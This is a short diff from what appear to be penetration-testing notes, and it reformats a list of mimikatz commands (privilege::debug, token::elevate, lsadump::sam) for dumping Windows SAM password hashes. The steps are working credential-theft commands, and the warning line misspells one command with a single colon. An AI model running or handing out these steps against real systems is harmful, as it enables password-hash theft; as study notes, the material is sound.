@@ -17,7 +17,7 @@ We use mimikatz to dump the SAM hashes. Also to extract the password hash from L
 * ⚠️ We must execute two commands "privilege::debug" and "token:elevate"
 
 Usage:
-1.- mimikatz.exe
-2.- privilege::debug
-3.- token::elevate
-4.- lsadump::sam
+* 1.- mimikatz.exe
+* 2.- privilege::debug
+* 3.- token::elevate
+* 4.- lsadump::sam
